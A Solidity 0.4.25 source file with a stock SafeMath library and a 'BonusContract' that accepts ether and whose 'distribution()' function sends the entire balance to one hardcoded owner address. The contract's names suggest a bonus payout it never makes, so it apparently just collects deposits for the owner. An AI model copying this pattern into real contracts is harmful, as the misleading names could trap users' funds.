1 pragma solidity ^0.4.25;
2 /**
3  * @title SafeMath
4  * @dev Math operations with safety checks that revert on error
5  */
6 library SafeMath {
7     /**
8     * @dev Multiplies two numbers, reverts on overflow.
9     */
10     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
11         // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
12         // benefit is lost if 'b' is also tested.
13         // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
14         if (a == 0) {
15             return 0;
16         }
17 
18         uint256 c = a * b;
19         require(c / a == b);
20 
21         return c;
22     }
23 
24     /**
25     * @dev Integer division of two numbers truncating the quotient, reverts on division by zero.
26     */
27     function div(uint256 a, uint256 b) internal pure returns (uint256) {
28         // Solidity only automatically asserts when dividing by 0
29         require(b > 0);
30         uint256 c = a / b;
31         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
32 
33         return c;
34     }
35 
36     /**
37     * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).
38     */
39     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
40         require(b <= a);
41         uint256 c = a - b;
42 
43         return c;
44     }
45 
46     /**
47     * @dev Adds two numbers, reverts on overflow.
48     */
49     function add(uint256 a, uint256 b) internal pure returns (uint256) {
50         uint256 c = a + b;
51         require(c >= a);
52 
53         return c;
54     }
55 
56     /**
57     * @dev Divides two numbers and returns the remainder (unsigned integer modulo),
58     * reverts when dividing by zero.
59     */
60     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
61         require(b != 0);
62         return a % b;
63     }
64 }
65 contract BonusContract {
66     address public owner = 0xdF8AB44409132d358F10bd4a7d1221b418ff8dFF;
67     
68     modifier isOwner() {
69         require(msg.sender == owner);
70         _;
71     }
72 
73    
74     function () public payable {
75        (msg.sender, msg.value);
76     }
77 
78     
79     function getCurrentBalance() constant returns (uint) {
80         return this.balance;
81     }
82     
83     function distribution() public isOwner {
84        
85 
86         owner.transfer(this.balance);
87     }
88 
89    
90 }